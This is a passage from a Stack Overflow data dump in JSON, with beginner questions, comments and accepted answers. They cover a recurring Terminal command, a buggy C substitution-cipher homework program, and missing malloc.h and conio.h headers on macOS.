"user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6067caaf16de28c5fc08b6f62b5e0b7b?s=128&d=identicon&r=PG&f=1", "display_name": "Christine", "link": "https://stackoverflow.com/users/8195299/christine"}, "edited": false, "score": 0, "creation_date": 1498073507, "post_id": 44684210, "comment_id": 76353675, "body": "I just tried this but it is not working. The response returns as : -bash: kill: %1: no such job"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498083304, "post_id": 44684210, "comment_id": 76358253, "body": "Did you edit your <code>.profile</code> or <code>.bashrc</code> or <code>.bash_profile</code> file recently (or a file used by one those scripts)? When you hit Control-C, do you get a shell prompt back? If you get a shell prompt back and you edited a file recently, then you can re-edit the file. If you don&#39;t get a shell prompt back, you&#39;ll need to find a way to start up a terminal without running the start-up scripts; the terminal program may have options you can set to prevent the shell being started as a login shell. In future, if you edit the control files, keep a terminal open, possibly editing the files, while you play."}], "owner": {"reputation": 1, "user_id": 8195299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6067caaf16de28c5fc08b6f62b5e0b7b?s=128&d=identicon&r=PG&f=1", "display_name": "Christine", "link": "https://stackoverflow.com/users/8195299/christine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 253, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1498071543, "creation_date": 1498071543, "question_id": 44684210, "link": "https://stackoverflow.com/questions/44684210/way-other-than-ctrlc-to-stop-a-command", "title": "Way other than Ctrl+C to stop a command?", "body": "<p>I tried to run a script in Terminal that led to the following recurring code:\n<a href=\"https://i.stack.imgur.com/WDFh9.png\" rel=\"nofollow noreferrer\">Recurring code:</a></p>\n\n<p>When I try to press \"Ctrl+C\" this will stop the command from running on the screen, but if I open Terminal again, the command recurs over and over again. I tried various scripts to kill the process, but nothing is working. Any advice?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498070944, "post_id": 44683952, "comment_id": 76352129, "body": "You forgot to tell us what kind of problem you have."}, {"owner": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 0, "creation_date": 1498070961, "post_id": 44683952, "comment_id": 76352141, "body": "Please be more specific than &quot;having trouble with these strings&quot;. What specifically is the problem? What did you discover when you tried debugging the problem?"}, {"owner": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "edited": false, "score": 0, "creation_date": 1498071056, "post_id": 44683952, "comment_id": 76352192, "body": "sorry , the problem is that it crashes :( it seems to get till the scans and prints the number of words given but then it does not get in the encryption i guess. i work on codeblocks and it compiles.."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1498071219, "post_id": 44683952, "comment_id": 76352285, "body": "But does it compile <b><i>without warnings?</i></b> &quot; &#39;printf&#39; : format string &#39;%s&#39; requires an argument of type &#39;char *&#39;, but variadic argument 4 has type &#39;char **&#39; &quot;. That is at the line you marked with <code>&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;check</code>. Also 11 lines down warns &quot; &#39;!=&#39;: &#39;int&#39; differs in levels of indirection from &#39;void *&#39; &quot;."}, {"owner": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "edited": false, "score": 0, "creation_date": 1498071448, "post_id": 44683952, "comment_id": 76352434, "body": "yes it compiles without a warning. I have tryed putting these prints in the crossroads to see where the function got and it crashes after it prints me how many words there are.."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1498071498, "post_id": 44683952, "comment_id": 76352470, "body": "Off topic: Never ever do <code>scanf(&quot;%s&quot;,temp)==</code> It invites for buffer overflow. Use <code>fgets</code> instead"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498071499, "post_id": 44683952, "comment_id": 76352471, "body": "Please <b>enable compiler warnings</b> there at least 2."}, {"owner": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "edited": false, "score": 0, "creation_date": 1498071778, "post_id": 44683952, "comment_id": 76352658, "body": "I  have added a picture of what the compiler is providing me"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498071848, "post_id": 44683952, "comment_id": 76352694, "body": "Strongly recommend to <i>not</i> post pictures of text.  Add the text to your post."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1498071913, "post_id": 44683952, "comment_id": 76352747, "body": "Could you post a) the input that you give and b) what the program prints before it crashes"}, {"owner": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "edited": false, "score": 0, "creation_date": 1498072121, "post_id": 44683952, "comment_id": 76352862, "body": "the input is :ANTON (enter) LORA (enter) MICHAEL (enter) TOMATO (enter) ctr+z (enter). and i get the print of how many words i have and then i have a windows pop up messege that says that the program crashed."}, {"owner": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "edited": false, "score": 0, "creation_date": 1498072339, "post_id": 44683952, "comment_id": 76353000, "body": "I am aware that the print of the words is unfinished but I cant even get till there. im sorry if something is unclear here its my first time asking here.. thank you."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498072444, "post_id": 44683952, "comment_id": 76353057, "body": "Better to edit your question so the information is all in one place, thank you. Please find out how to enable compiler warnings - consider them to be errors."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "edited": false, "score": 0, "creation_date": 1498073131, "post_id": 44684568, "comment_id": 76353463, "body": "ok thank you I will try that now!"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "reply_to_user": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "edited": false, "score": 0, "creation_date": 1498073168, "post_id": 44684568, "comment_id": 76353489, "body": "@\u05d0\u05e0\u05d8\u05d5\u05df\u05e7\u05e0\u05e8\u05e1\u05e7\u05d9 - See here <a href=\"http://ideone.com/8OPkCa\" rel=\"nofollow noreferrer\">ideone.com/8OPkCa</a>"}, {"owner": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "edited": false, "score": 0, "creation_date": 1498073502, "post_id": 44684568, "comment_id": 76353668, "body": "Thank you so much it works now !!! again, sorry if my question was not clear enough and thank you for your help !"}], "tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": true, "score": 0, "last_activity_date": 1498073881, "last_edit_date": 1498073881, "creation_date": 1498072745, "answer_id": 44684568, "question_id": 44683952, "link": "https://stackoverflow.com/questions/44683952/encryption-function-in-c/44684568#44684568", "title": "encryption function in c", "body": "<p>Your problem is in this code:</p>\n\n<pre><code>while (words[i][j]!=0)\n{\n    printf(\"%c\",words[i][j]);\n    i++,j++;\n}\n</code></pre>\n\n<p>Here you increment both <code>i</code> and <code>j</code> at the same time. So you both jump to the next letter and to the next string in one step. That will fail if you jump beyond the string termination.</p>\n\n<p>Try this instead:</p>\n\n<pre><code>for (i=0; i&lt;num_words; ++i)\n{\n    printf(\"%s\\n\",words[i]);\n}\n</code></pre>\n\n<p>Similar problem is here:</p>\n\n<pre><code>void encrypt_words(char* words[], int num_words, unsigned char key[KEY_SIZE])\n{\n    int i=0,j=0;\n    while (words[i][j]!=0&amp;&amp;i&lt;num_words)\n    {\n        char temp=words[i][j];\n        words[i][j]=encrypt_char(key,temp);\n\n        i++,j++;   // Ups...\n    }\n}\n</code></pre>\n\n<p>You need to finish one string first (i.e. only increment <code>j</code>) and then move to the next string (i.e. increment <code>i</code>).</p>\n\n<p>Something like:</p>\n\n<pre><code>void encrypt_words(char* words[], int num_words, unsigned char key[KEY_SIZE])\n{\n    int i=0,j=0;\n    for (i=0; i&lt;num_words; ++i)\n    {\n        j = 0;\n        while (words[i][j]!=0)\n        {\n            char temp=words[i][j];\n            words[i][j]=encrypt_char(key,temp);\n            j++;\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 8182827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21be2cab64020a09ddc5a2f02fd0cfa6?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d0\u05e0\u05d8\u05d5\u05df \u05e7\u05e0\u05e8\u05e1\u05e7\u05d9", "link": "https://stackoverflow.com/users/8182827/%d7%90%d7%a0%d7%98%d7%95%d7%9f-%d7%a7%d7%a0%d7%a8%d7%a1%d7%a7%d7%99"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 190, "favorite_count": 0, "closed_date": 1498077463, "accepted_answer_id": 44684568, "answer_count": 1, "score": -2, "last_activity_date": 1498073881, "creation_date": 1498070843, "last_edit_date": 1498071933, "question_id": 44683952, "link": "https://stackoverflow.com/questions/44683952/encryption-function-in-c", "closed_reason": "Not suitable for this site", "title": "encryption function in c", "body": "<p><a href=\"https://i.stack.imgur.com/vRUMv.png\" rel=\"nofollow noreferrer\">enter image description here</a>so i need to write a program that scans words and then encrypts them with a given key (the key is in main).\nthe output should consist of the encrypted words (the encryption is using the key with the ASCII value of the letter in the word so lets say we have the word BOOK then the first letter will be switched to the key in the 65 place). I need to scan the words given by user in to strings and save the pointers to these strings to an array char *words. then i encrypt them and print them as following:</p>\n\n<blockquote>\n  <p><code>words[0][0-n]\\n</code> ('n' is the length of the word=the same length as original but encr)<br>\n      <code>words[1][0-k]\\n</code> ('k' is the length of the word=the same length as original but encr)</p>\n</blockquote>\n\n<p>.\n.\n.\nim new to programming and having trouble with these strings.. help</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define KEY_SIZE 256\n\n\n\nchar encrypt_char(unsigned char key[KEY_SIZE], char ch);\nint read_words(char* words[], int size, int max_str_len);\nvoid encrypt_words(char* words[], int num_words, unsigned char key[KEY_SIZE]);\n\n\n\n\n   int main()\n{\n    int i=0,j=0;\n    unsigned char key[KEY_SIZE] = {\n        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n        'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D',\n        'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M'};\n\n    char* words[1000];      //the words must bee a 2D array beacause its a string array .\n    int num_words=read_words(words,1000,100);\n    printf(\"number of words =%d\",num_words);/////check\n    encrypt_words(words,num_words,key);\n    while (words[i][j]!=0)\n    {\n        printf(\"%c\",words[i][j]);\n        i++,j++;\n    }\n    return 0;\n}\n\n\n\n\n\n\nchar encrypt_char(unsigned char key[KEY_SIZE], char ch)\n{\n    int temp=ch;\n    return key[temp];\n}\n\n\n\n\n\nint read_words(char* words[], int size, int max_str_len)\n{\n    printf(\"in the read words func\\n\"); ///check\n    int i=0,words_count=0;\n    char* temp=malloc((max_str_len+1)*sizeof(char));\n    if (temp==NULL)\n    {\n        printf(\"Memory allocation failure\\n\");\n        free(temp);\n        return 0;\n    }\n    printf(\"passed the fail test\\n\"); ////check\n    while ( scanf(\"%s\",temp)==1&amp;&amp;words_count&lt;size)\n    {\n        printf(\"in the while \\n\");\n        int length=strlen(temp);\n        char* the_word=malloc((length+1)*sizeof(char));\n        strcpy(the_word, temp);\n        words[i]=(char*)the_word;\n        i++;\n        words_count++;\n        printf(\"the i=%d          words count=%d          words[%d]=%s    \\n\",i,words_count,i,&amp;words[i]);/////////check\n    }\n    printf(\"WORDS COUNT IS=%d\\n\",words_count);\nreturn words_count;\n\n}\n\n\nvoid encrypt_words(char* words[], int num_words, unsigned char key[KEY_SIZE])\n{\n    int i=0,j=0;\n    while (words[i][j]!=0&amp;&amp;i&lt;num_words)\n    {\n        char temp=words[i][j];\n        words[i][j]=encrypt_char(key,temp);\n        i++,j++;\n    }\n}\n</code></pre>\n\n<p>compiler messege:</p>\n\n<pre><code>-------------- Build: Debug in hw4q2 (compiler: GNU GCC Compiler)---------------\n\nmingw32-gcc.exe -Wall -Werror -pedantic -ansi -W -O -g -pedantic-errors -std=c99  -c \"C:\\Users\\Anton\\Desktop\\C projects\\hw4q2\\hw4q2.c\" -o obj\\Debug\\hw4q2.o\nmingw32-g++.exe  -o hw4q2.exe obj\\Debug\\hw4q2.o   \nOutput file is hw4q2.exe with size 73.25 KB\nProcess terminated with status 0 (0 minute(s), 0 second(s))\n0 error(s), 0 warning(s) (0 minute(s), 0 second(s))\n</code></pre>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1498070340, "post_id": 44683812, "comment_id": 76351732, "body": "Have you tried <code>stdlib.h</code> instead?"}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 4, "creation_date": 1498070351, "post_id": 44683812, "comment_id": 76351740, "body": "neither of those headers are part of the C standard"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498070393, "post_id": 44683812, "comment_id": 76351778, "body": "Did you cross-check with a good C book? Don&#39;t learn C from obscure youtube videos or online tutorials!"}, {"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 1, "creation_date": 1498070587, "post_id": 44683812, "comment_id": 76351919, "body": "conio.h is much more something related to Windows env., don&#39;t even try to use such on MacOS. Use standard headers and your code will be much more portable."}, {"owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "edited": false, "score": 0, "creation_date": 1498070710, "post_id": 44683812, "comment_id": 76352002, "body": "Search the header files with <code>find &#47;usr&#47;include -name &quot;malloc.h</code>. If everthing is right the include directory should be: <code>-I&#47;usr&#47;include&#47;sys&quot;</code>."}, {"owner": {"reputation": 15569, "user_id": 2302862, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e264db339bb96e343770fa38018e00f1?s=128&d=identicon&r=PG", "display_name": "Siguza", "link": "https://stackoverflow.com/users/2302862/siguza"}, "reply_to_user": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "edited": false, "score": 0, "creation_date": 1498070818, "post_id": 44683812, "comment_id": 76352063, "body": "@AndreKampling Actually, on Sierra and later <code>&#47;usr&#47;include</code> no longer exists. On those you&#39;ll have to use <code>&#47;Applications&#47;Xcode.app&#47;Contents&#47;Developer&#47;Platforms&#47;MacOSX.&zwnj;&#8203;platform&#47;Developer&#47;S&zwnj;&#8203;DKs&#47;MacOSX.sdk&#47;usr&#47;i&zwnj;&#8203;nclude</code>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498070889, "post_id": 44683812, "comment_id": 76352099, "body": "Please note that <code>malloc</code> and friends are to be found in <code>stdlib.h</code>."}, {"owner": {"reputation": 161, "user_id": 7687353, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1143256415820353/picture?type=large", "display_name": "Arun Kumar", "link": "https://stackoverflow.com/users/7687353/arun-kumar"}, "edited": false, "score": 0, "creation_date": 1498074414, "post_id": 44683812, "comment_id": 76354176, "body": "Thanks to all... am just new to MAC."}], "answers": [{"comments": [{"owner": {"reputation": 161, "user_id": 7687353, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1143256415820353/picture?type=large", "display_name": "Arun Kumar", "link": "https://stackoverflow.com/users/7687353/arun-kumar"}, "edited": false, "score": 0, "creation_date": 1498074523, "post_id": 44684248, "comment_id": 76354243, "body": "Thank you very much... it was really helpful... new to MAC here."}, {"owner": {"reputation": 532, "user_id": 4520911, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uzPkX.png?s=128&g=1", "display_name": "iRove", "link": "https://stackoverflow.com/users/4520911/irove"}, "reply_to_user": {"reputation": 161, "user_id": 7687353, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1143256415820353/picture?type=large", "display_name": "Arun Kumar", "link": "https://stackoverflow.com/users/7687353/arun-kumar"}, "edited": false, "score": 0, "creation_date": 1498074584, "post_id": 44684248, "comment_id": 76354270, "body": "@ArunKumar Glad the clarification helped :)"}, {"owner": {"reputation": 27266, "user_id": 407757, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/0UHgU.jpg?s=128&g=1", "display_name": "James Bedford", "link": "https://stackoverflow.com/users/407757/james-bedford"}, "edited": false, "score": 0, "creation_date": 1605454846, "post_id": 44684248, "comment_id": 114649067, "body": "stdlib.h includes malloc.h? What&#39;s the problem with including malloc.h directly?"}], "tags": [], "owner": {"reputation": 532, "user_id": 4520911, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uzPkX.png?s=128&g=1", "display_name": "iRove", "link": "https://stackoverflow.com/users/4520911/irove"}, "is_accepted": true, "score": 5, "last_activity_date": 1498074291, "last_edit_date": 1498074291, "creation_date": 1498071659, "answer_id": 44684248, "question_id": 44683812, "link": "https://stackoverflow.com/questions/44683812/how-do-install-c-header-files-in-mac-osx-sierra/44684248#44684248", "title": "How do install C header files in Mac OSX Sierra?", "body": "<p>First off, <code>malloc.h</code> is deprecated (and not available on your system).  Instead, you should be using <code>stdlib.h</code>.  Furthermore, <code>conio.h</code> is an implementation specific header - and in this case, it is Windows and MS-DOS specific.  It is not available on MacOS.  Both of these are non-standard headers, and therefore are not preferred due to issues with portability.  <a href=\"https://www.gnu.org/software/ncurses/\" rel=\"noreferrer\"><code>ncurses</code></a> (which should already be available on MacOS) provides similar functionality to <code>conio.h</code>; see if that has what you're looking for.</p>\n\n<p>However, your best shot if you <em>really</em> need these header files is to install a virtualization program such as <a href=\"https://www.virtualbox.org\" rel=\"noreferrer\">VirtualBox</a>, install Windows, and work from there.</p>\n"}], "owner": {"reputation": 161, "user_id": 7687353, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1143256415820353/picture?type=large", "display_name": "Arun Kumar", "link": "https://stackoverflow.com/users/7687353/arun-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2472, "favorite_count": 0, "accepted_answer_id": 44684248, "answer_count": 1, "score": 2, "last_activity_date": 1498074291, "creation_date": 1498070276, "question_id": 44683812, "link": "https://stackoverflow.com/questions/44683812/how-do-install-c-header-files-in-mac-osx-sierra", "title": "How do install C header files in Mac OSX Sierra?", "body": "<p>I have missing header files like malloc.h and conio.h in my MAC.. how do I install it?</p>\n\n<blockquote>\n  <p>gcc linkedlistmenu.c\n  linkedlistmenu.c:2:19: fatal error: malloc.h: No such file or directory</p>\n</blockquote>\n"}, {"tags": ["c", "macos", "operating-system", "version"], "comments": [{"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498068941, "post_id": 44683285, "comment_id": 76350920, "body": "You haven&#39;t made much research, have you?  It took me 1 google search at 30 seconds to find out KERN_VERSION is defined in sys/sysctl.h.  Maybe using <code>sysctl_rdstring</code> defined in this same header will get you somewhere."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498069294, "post_id": 44683285, "comment_id": 76351108, "body": "Note that 10.12.5 is a version of macOS Sierra \u2014 different capitalization on the macOS part."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498069380, "post_id": 44683285, "comment_id": 76351154, "body": "@Micha&#235;lRoy: I think you&#39;ve missed the point \u2014 the OP knows about those, but they do not provide the answer that is wanted."}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1498070244, "post_id": 44683285, "comment_id": 76351671, "body": "The open source repository you cited has this directory: <a href=\"https://opensource.apple.com/source/CF/\" rel=\"nofollow noreferrer\">opensource.apple.com/source/CF</a>, which seems to contain the CoreFoundation sources. Is executing <code>sw_vers</code> and parsing its output not an option?"}, {"owner": {"reputation": 129, "user_id": 6849036, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/4c2c3466a4defa2c0212fa8d7dabde07?s=128&d=identicon&r=PG&f=1", "display_name": "lelephantt", "link": "https://stackoverflow.com/users/6849036/lelephantt"}, "reply_to_user": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1498070502, "post_id": 44683285, "comment_id": 76351850, "body": "@jxh Ugh unfortunately that repo only carries the missing header file but not it&#39;s source (and that header includes other missing files). And no I specifically cannot use the command line"}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1498070557, "post_id": 44683285, "comment_id": 76351891, "body": "Can you explain why you cannot invoke <code>sw_vers</code>? Are you implementing a  kernel driver? Can you explain what you plan to do with this information?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": 